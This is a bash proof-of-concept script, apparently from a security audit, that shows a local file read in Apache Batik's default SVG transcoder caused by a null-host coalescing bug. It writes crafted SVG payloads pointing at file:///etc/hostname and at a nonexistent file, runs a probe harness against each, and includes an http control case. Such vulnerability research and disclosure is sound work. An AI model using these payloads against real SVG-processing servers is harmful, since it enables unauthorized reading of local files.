#!/usr/bin/env bash
# F-6 — Local file read on the DEFAULT transcoder via the null-host coalescing bug.
# DefaultExternalResourceSecurity: when the document URL has no host (any file: URI) and the resource
# is also file: (host null), `(docHost != externalResourceHost)` is `null != null` = false -> the guard
# short-circuits -> unconditional allow. A server transcoding an uploaded SVG by its file: URI lets that
# SVG open arbitrary local files. NOTE: disclosure is constrained to Batik-parseable content (images/SVG);
# a non-parseable file (/etc/hostname) is read/opened but not echoed. file:->http is correctly blocked.
# Severity: Medium, conditional on the file:-URI transcode pattern.
set -uo pipefail
LAB="${BATIK_LAB_DIR:-/tmp/batik-lab}"; cd "$LAB"
CP="$(printf '%s' "$LAB/batik-1.19/lib/*"):$LAB"

cat > f6_nx.svg <<'SVG'
<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20"><image width="20" height="20" xlink:href="file:///tmp/batik-lab/DOES_NOT_EXIST_9f3a.dat"/></svg>
SVG
cat > f6_hn.svg <<'SVG'
<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20"><image width="20" height="20" xlink:href="file:///etc/hostname"/></svg>
SVG
cat > f6_http.svg <<'SVG'
<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="20" height="20"><image width="20" height="20" xlink:href="http://127.0.0.1:9999/blocked"/></svg>
SVG
echo "== [1] file: doc + NONEXISTENT file: resource -> FileNotFound proves the gate PASSED (openStream reached FS) =="
java -cp "$CP" BatikProbe "$LAB/f6_nx.svg" "file:$LAB/f6_nx.svg" 2>&1 | grep -iE "No such file|FileNotFound|CAUSE|different location" | head -2
echo "== [2] file: doc + /etc/hostname (read; image-decode then fails; NO SecurityException) =="
java -cp "$CP" BatikProbe "$LAB/f6_hn.svg" "file:$LAB/f6_hn.svg" 2>&1 | grep -iE "hostname|could not|different location|SecurityException|TRANSCODE" | head -2
echo "== [3] file: doc + http: resource (must be BLOCKED — only file:->file: bypasses) =="
java -cp "$CP" BatikProbe "$LAB/f6_http.svg" "file:$LAB/f6_http.svg" 2>&1 | grep -i "different location\|SecurityException" | head -1
echo "EXPECT: [1] 'No such file or directory' (gate passed), [2] /etc/hostname read (no security block), [3] http blocked."
